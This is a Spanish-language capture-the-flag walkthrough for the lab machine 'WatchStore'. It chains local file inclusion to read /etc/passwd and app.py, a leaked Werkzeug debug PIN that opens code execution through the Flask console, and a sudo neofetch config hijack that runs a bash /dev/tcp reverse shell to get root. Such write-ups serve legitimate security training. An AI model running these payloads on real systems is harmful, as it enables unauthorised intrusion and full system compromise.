# WatchStore | TheHackersLabs
## 🔍 1. Reconocimiento de red
Escaneo ARP para identificar hosts activos en la red local:
```bash
sudo arp-scan -I eth0 --localnet
```
Respuesta interesante:
```bash
192.168.1.97    a4:2b:8c:e4:f5:bc    (Unknown)
```
Verificación de conectividad:
```bash
ping -c 1 192.168.1.97
```

## 🔎 2. Descubrimiento de servicios con Nmap
```bash
nmap -p- --open -sS -sC -sV --min-rate=5000 -Pn 192.168.1.97 -oN escaneo.txt
```
Puertos abiertos:
```text
22/tcp → OpenSSH 9.2p1
8080/tcp → Werkzeug httpd 2.1.2 (Python 3.11.2)
```

## 🌐 3. Acceso al servicio web
En el navegador:
- http://192.168.1.97:8080 redirige a http://watchstore.thl:8080.
Se añade la entrada en /etc/hosts:
```text
192.168.1.97    watchstore.thl
```

## 🧪 4. Fuzzing de rutas con ffuf
```bash
ffuf -u http://watchstore.thl:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt,.bak -mc 200,204,301,302,307,403
```
Resultado:
- Rutas interesantes:
```text
/console
/read
```

## 🔐 5. Ruta /console: consola Flask protegida con PIN
Aparece protegida por un PIN.

## 🕵️‍♂️ 6. LFI en /read?id=
Ruta vulnerable:
```text
/read?id=/etc/passwd
```
Lectura exitosa. Se detecta el usuario relox.

Luego, se lee el código fuente:
```text
/read?id=/home/relox/watchstore/app.py
```

Y se obtiene el PIN:
```text
os.environ['WERKZEUG_DEBUG_PIN'] = '612-791-734'
```

## 🧑‍💻 7. Acceso a consola interactiva Flask
- Se accede a /console y se desbloquea con el PIN.
- Desde ahí se ejecutan comandos como usuario relox.

## 📂 8. Lectura de primera flag
```bash
print(open("/home/relox/user.txt").read())
```
Se obtiene una flag de usuario.

## 🔓 9. Escalada de privilegios con sudo -l
```bash
print(os.popen("sudo -l").read())
```
Salida:
```text
(root) NOPASSWD: /usr/bin/neofetch
```

## 💣 10. Explotación de neofetch
Crear script malicioso:
```bash
with open("/tmp/root.sh", "w") as f:
    f.write("#!/bin/bash\nbash -i >& /dev/tcp/192.168.1.109/4444 0>&1\n")

os.system("chmod +x /tmp/root.sh")
```
Crear archivo de configuración:
```bash
with open("/home/relox/.config/neofetch/config.conf", "w") as f:
    f.write("print_info() {\n    /tmp/root.sh\n}\nprint_info")
```

## 🛰️ 11. Obtener shell reverse como root
En la máquina atacante:
```bash
nc -lvnp 4444
```
Desde la consola Flask:
```bash
os.system("sudo XDG_CONFIG_HOME=/home/relox/.config neofetch")
```
✅ Se obtiene acceso como root.

## 🏁 12. Captura de la flag final
```bash
cat /root/root.txt
```

## ✅ Conclusión
- El reto se resuelve combinando:
- LFI → para leer archivos sensibles
- Desbloqueo de consola Flask → RCE en servidor
- sudo mal configurado → neofetch con configuración modificable
- Reverse shell → acceso root remoto
